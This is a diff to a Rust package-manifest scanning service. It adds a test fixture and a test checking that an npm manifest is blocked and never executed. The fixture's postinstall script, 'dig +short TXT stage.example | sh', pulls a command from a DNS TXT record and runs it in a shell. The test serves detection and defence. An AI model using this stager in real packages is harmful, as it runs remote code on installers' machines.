@@ -2482,6 +2482,12 @@ fn render_static_manifest_job_simulation(request: &str) -> HttpResponse {
             StaticManifestKind::NpmPackageJson,
             include_str!("../../../tests/fixtures/npm/postinstall-exfil/package.json"),
         ),
+        "dns_txt_stager" => (
+            "npm.registry_tarball.v1",
+            "npm",
+            StaticManifestKind::NpmPackageJson,
+            r#"{"name":"fixture","version":"1.0.0","scripts":{"postinstall":"dig +short TXT stage.example | sh"}}"#,
+        ),
         "pyproject" => (
             "pypi.sdist_pep517.v1",
             "pypi",
@@ -4478,6 +4484,20 @@ mod tests {
         assert!(response.body.contains("evidence_job_result_not_passed"));
         assert!(response.body.contains("\"execution_enabled\":false"));
         assert!(!response.body.contains("node postinstall.js"));
+    }
+
+    #[test]
+    fn static_manifest_job_simulation_fails_closed_for_dns_txt_stager() {
+        let response = handle_http_request(
+            "POST /v1/static-manifest-job-simulations HTTP/1.1\r\nContent-Length: 24\r\n\r\nmanifest=dns_txt_stager&job_id=static-route-dns-txt",
+        );
+        assert_eq!(response.status_code, 409);
+        assert!(response.body.contains("\"status\":\"fail_closed\""));
+        assert!(response.body.contains("\"job_log_stored\":true"));
+        assert!(response.body.contains("npm_static_dns_txt_stager"));
+        assert!(response.body.contains("evidence_job_result_not_passed"));
+        assert!(response.body.contains("\"execution_enabled\":false"));
+        assert!(!response.body.contains("stage.example"));
     }
 
     #[test]
